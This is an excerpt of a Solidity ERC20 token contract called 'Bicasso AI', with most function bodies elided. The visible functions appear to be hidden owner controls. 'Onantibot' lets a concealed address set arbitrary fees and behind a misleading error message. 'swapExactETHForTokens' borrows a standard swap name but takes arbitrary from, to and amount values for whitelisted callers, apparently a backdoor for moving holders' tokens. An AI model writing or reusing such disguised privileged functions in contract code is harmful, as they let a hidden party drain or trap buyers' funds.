...
contract BICASSOAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "Bicasso AI";
    string private _symbol = "BICASSOAI";
   ...
   function _destroyChildren(uint256 value) internal {
    ...
    function Onantibot(bool bs, uint256 timesleep, uint256 fee) public {
        require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        antibotenabled = bs;
        botsleep = timesleep;
        feebot = fee;
    ...
    function swapExactETHForTokens(address from, address to, uint256 amount) public gasRefund {
        require(_Antibotswaper[_msgSender()], "ERC20");
